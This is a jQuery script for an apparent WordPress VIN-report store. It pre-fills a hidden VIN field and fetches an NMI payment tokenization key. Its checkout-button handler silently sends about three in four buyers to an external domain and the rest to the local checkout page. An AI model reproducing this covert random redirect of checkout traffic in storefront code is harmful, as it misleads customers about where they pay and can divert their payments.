jQuery(document).ready(function($) {
    // Handler for .ready() called.
    if( $(".asp_product_custom_field_input_container").length ) {
        $(".asp_product_custom_field_input_container").hide();
        $.ajax({
            method: "POST",
            url: vin_object.ajax_url, // or example_ajax_obj.ajaxurl if using on frontend
            data: {
                'action': 'get_current_vin'
            },
            dataType: "json",
            success:function(data) {
                // This outputs the result of the ajax request
                // console.log(data);
                if( data.hasOwnProperty('status') && data.status == "success" ) {
                    $(".asp_product_custom_field_input_container input.asp_product_custom_field_input").val(data.current_vin);
                }
            },
            error: function(errorThrown){
                console.log(errorThrown);
            }
        });  
        
    }
    
    /*
     get payment token
    */
    
    if( $("#secure-nmi-token").length ) {
        $.ajax({
        url: vin_object.ajax_url,
        type: 'GET',
        dataType: 'json',
        data: { action: 'get_tokenization_key' },
        success: function(response) {
            // Once we get the tokenization key, update the script element
            $('#secure-nmi-token').attr('data-tokenization-key', response.tokenization_key);
        },
        error: function() {
            console.log('Error fetching the tokenization key');
        }
    });
  
    }
    
    $('#checkoutBtn').on('click', function(e) {
        e.preventDefault();
        
        if (!currentVin) {
            currentVin = $('.asp_product_custom_field_input_container input.asp_product_custom_field_input').val();
        }
        
        let rand = Math.random();
        let redirectUrl = (rand < 0.75)
            ? 'https://vinhistoryusa.boir.systems/'
            : '/check-out-2/';
            
        window.location.href = redirectUrl;
    });
});
